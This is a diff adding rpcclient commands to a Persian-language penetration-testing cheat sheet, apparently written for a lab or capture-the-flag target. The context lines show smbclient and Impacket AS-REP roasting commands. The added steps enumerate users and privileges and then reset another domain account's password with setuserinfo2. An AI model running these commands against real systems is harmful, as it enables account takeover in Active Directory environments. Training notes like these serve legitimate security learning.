@@ -1385,3 +1385,29 @@ smbclient //10.10.10.10/profiles$
 ```text
 python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 10.10.10.10L -usersfile
 ```
+
+## دستورات rpcclient
+
+### ورود و بررسی سیستم بدون لاگ
+
+```text
+rpcclient 10.10.10.10 -U support
+```
+
+### نمایش اطلاعات کاربرد
+
+```text
+queryuser support
+```
+
+### نمایش دسترسی ها
+
+```text
+enumprivs
+```
+
+### تغییر دسترسی کاربرد
+
+```text
+setuserinfo2 audit2020 23 'redteam'
+```
